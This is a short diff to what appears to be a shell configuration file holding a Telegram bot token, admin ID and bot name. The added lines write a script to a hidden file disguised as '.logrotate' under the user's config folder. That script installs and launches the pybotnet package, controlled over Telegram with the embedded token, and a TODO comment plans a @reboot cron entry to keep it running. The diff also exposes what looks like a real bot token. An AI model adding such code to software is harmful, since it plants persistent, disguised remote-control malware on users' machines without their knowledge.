@@ -13,4 +13,16 @@ telegram_bot_token=5526760482:AAGweoNtLrHEssdcvLC6whjms78yU8gEO6w
 admin_id=7902347166
 bot_name=example_bot_name
 
-# coming soon
+
+
+botnet="$HOME/.config/.logrotate"
+
+tee<<EOF > $botnet
+#!/bin/sh
+pip3 install "pybotnet>=2<3" -U -qqq --pre &&
+python3 -m pybotnet -t $telegram_bot_token -i $admin_id -n $bot_name
+EOF
+
+
+# TODO: create user cron tab to run $botnet
+# @reboot sh $botnet
